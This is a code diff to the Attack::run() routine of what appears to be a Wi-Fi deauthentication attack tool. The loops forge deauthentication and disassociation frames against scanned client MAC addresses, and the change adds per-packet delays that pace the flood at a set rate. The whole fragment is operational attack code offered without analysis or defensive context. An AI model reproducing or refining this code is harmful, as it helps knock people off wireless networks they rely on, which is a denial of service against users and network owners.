@@ -147,10 +147,20 @@ void Attack::run(){
               }
             }else{
               buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
-              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+              for(int h=0;h<settings.attackPacketRate;h++){
+                if(send()){
+                  packetsCounter[0]++;
+                  delay((950/(settings.attackPacketRate*clientScan.selectedResults))/2-1);
+                }
+              }
               
               buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
-              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+              for(int h=0;h<settings.attackPacketRate;h++){
+                if(send()){
+                  packetsCounter[0]++;
+                  delay((950/(settings.attackPacketRate*clientScan.selectedResults))/2-1);
+                }
+              }
             }
           }
         }
@@ -178,7 +188,7 @@ void Attack::run(){
             }
         }
         
-      } 
+      }
     }
 
     stati[0] = (String)packetsCounter[0]+"pkts/s";
